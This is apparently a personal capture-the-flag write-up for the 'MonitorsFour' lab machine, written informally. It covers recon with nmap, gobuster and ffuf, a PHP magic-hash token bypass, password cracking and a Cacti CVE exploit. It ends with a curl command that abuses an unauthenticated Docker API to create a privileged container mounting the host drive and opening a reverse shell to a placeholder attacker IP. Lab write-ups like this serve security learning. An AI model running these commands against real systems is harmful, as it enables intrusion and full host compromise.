# scan ports

i used nmap to find open ports

```
nmap -A 10.10.48.167
```

- i found that port 80 is open 
- i opend link in the browser and added its domin to /etc/hosts 

> i found that website has no registartion and forgot password need an sepecifed email that on server so we need to find any hidden page that can help us such as giving to me a data now i need to know all hiden pages we can use gobuster

# find hidden pages

```
gobuster dir -u  http://monitorsfour.htb -w /usr/share/dirb/wordlists/common.txt
```

and it result it

```
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://monitorsfour.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 146]
/.hta                 (Status: 403) [Size: 146]
/.htpasswd            (Status: 403) [Size: 146]
/contact              (Status: 200) [Size: 367]
/controllers          (Status: 301) [Size: 162] [--> http://monitorsfour.htb/controllers/]
/forgot-password      (Status: 200) [Size: 3099]
/login                (Status: 200) [Size: 4340]
/static               (Status: 301) [Size: 162] [--> http://monitorsfour.htb/static/]
/user                 (Status: 200) [Size: 35]
/views                (Status: 301) [Size: 162] [--> http://monitorsfour.htb/views/]
Progress: 4613 / 4613 (100.00%)
===============================================================
Finished
===============================================================
```


i found /user page with status 200 i think this will help us when i open it it give me a respond in json format Missing token parmater its look like that  is an api anyways i tired put a token value to see its respond it gives me invalid or missed token argument so we have to know how that backend code works if the php code uses == in the condition we can bypass the token 

to explain there is a thing called magin hash its like 0e12345 
when you use == in php its convert the follwoing value to a number its literay see this like that 0 x 10 ^ 23456 so because  the number is Multiplied by 0 it will always  gives us 0 if the real token was be like this format like 0e4781
so the condtion will be always true because 0 = 0 that will gives us true so we now succesful bypassed the condtion the api now will give us the users data

we can inject the bypass with the url ?token = bypass code

and the apis gives to us data

lets explore it 

i found user admin is the super user and we found its password with md5 hash format i decrypted it using https://www.dcode.fr/md5-hash you can also use hach cat and use rockyou world list anyways it give me wonderfull

i login into admin now succesufly

i stuck in point in this challenge i read a writeup to see what is the proplem i found that he used .env to see the data but goubuser ddidnt result it to me maybe the commnon.txt does not conating .env anyways we know now what we have to do 

i found nothing in .env so we can  fuz a domin with world list

# find hidden subdomains 

```
ffuf -c -u http://monitorsfour.htb/ -H "Host: FUZZ.monitorsfour.htb" -w subdomains-top1mil-20000.txt -fw 3
```

cacti                   [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 712ms]
:: Progress: [20000/20000] :: Job [1/1] :: 90 req/sec :: Duration: [0:02:30] :: Errors: 0 ::

and we found cacti !

ok we now must add this to host config file to acsses the web 

after that we can  use our data that we are located in user api  

i tired admin and wonderfull but it doesnot work
i tired  Marcus Higgins and wonderfull the same too
Marcus and wonderful1 worked !!


i tired used a pure commands to do the same thing that cve does

# explot using CVE-2025-24367

``` 
https://github.com/TheCyberGeek/CVE-2025-24367-Cacti-PoC
```

anyways i found that my proplrm i put my url with index.php i must just use  cacti.monitorsfour.htb :|

now we can find that path of the user.txt
we can type 

# find the path of the user.txt
```
find / -name user.txt
```
- cat user.txt and booom we have pwned the user.txt 
now we have to get root we must know which apps has a root privalge 


# anlayze network and find vulnerabilities

> we can view our ip with 

```
ip route
```
- it gives us 172.x.x.x that not netwrok from router it might be a docker 

- we can read the config file /etc/resolv.conf shows a    nameserver 127.0.0.11 (Docker DNS), which forwards queries to 192.168.x.x.

> ok we found the genral ip we w can scan it to find any vulnerabilities or any thing we dont have python
> so we have touse built in commands we can use

```
for port in {1..65535}; do timeout 1 bash -c "</dev/tcp/192.168.65.7/$port" && echo "Port $port is open"; done 
```

when there is a connection with any port it will gives us open 

> so after that we found port 2375 open that port is the Docker API Escape that api can be used to create mange conatiners  so this that olny is a valunabrity we can use this api to craete a new high privlged conatainer that can read the windows files and by this we can read the windowss files and get root.txt honstly i see that nano writeup is very help full link 

# privesc (exploit method to escape docker)

https://medium.com/@nano246812/instant-root-via-unauthenticated-docker-engine-api-tcp-2375-from-low-priv-container-full-root-0cc368bc7aef


i follwed his instarctions 
www-data@821fbd6a43fa:~/html/cacti$ curl http://192.168.65.7:2375/version

it realy has no filtration so we can send json data and mont the c drive i will copy nano writeup commands


the web shell doesnt have and stable interactive method so i use one line command to fix any proplems

# open listener

```
nc -lvnp 4444 open listner
```

# create higher privlaged docker that can read windows files

```
curl -X POST "http://192.168.65.7:2375/v1.44/containers/create?name=pwn123" -H "Content-Type: application/json" -d '{"Image":"docker_setup-nginx-php:latest","Cmd":["/bin/bash","-c","bash -i >& /dev/tcp/YOUR_ATTACKER_IP/THE_LISTNER_PORT 0>&1"],"HostConfig":{"Binds":["/mnt/host/c:/host"],"Privileged":true},"Tty":true,"OpenStdin":true}'
```

# run the contanier

```
curl -X POST http://192.168.65.7:2375/v1.44/containers/pwn123/start 
```
- run conatiner and booom in the listner we have the revrse shell of root now have fun :)
